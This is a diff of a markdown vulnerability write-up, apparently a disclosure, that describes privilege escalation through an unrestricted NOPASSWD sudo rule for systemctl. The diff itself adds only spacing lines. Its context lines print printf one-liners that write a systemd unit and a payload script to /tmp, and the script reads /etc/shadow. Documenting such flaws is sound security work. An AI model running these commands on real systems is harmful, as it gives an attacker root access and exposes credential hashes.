@@ -43,6 +43,8 @@ Expected output:
 
 ```(ALL) NOPASSWD: /usr/bin/systemctl```
 
+<br>
+
 If the output shows a restricted form such as /usr/bin/systemctl restart reachy-mini-daemon, the escalation is blocked - skip to Impact.
 
 <br>
@@ -53,11 +55,14 @@ From a raw nc/reverse shell where heredoc and multi-line paste may not work, use
 
 `printf '[Unit]\nDescription=privesc\n\n[Service]\nType=oneshot\nExecStart=/tmp/.pwn.sh\nRemainAfterExit=no\n\n[Install]\nWantedBy=multi-user.target\n' > /tmp/.pwn.service`
 
+<br>
 
 Write the payload script separately (avoids quoting issues in ExecStart):
 
 `printf '#!/bin/sh\nid > /tmp/.pwn_proof.txt\nhead -1 /etc/shadow >> /tmp/.pwn_proof.txt\necho CHAIN_COMPLETE >> /tmp/.pwn_proof.txt\n' > /tmp/.pwn.sh
 chmod +x /tmp/.pwn.sh`
+
+<br>
 
 /tmp is world-writable. Both files are owned by pollen:pollen. No elevated privilege is needed for this step.
 
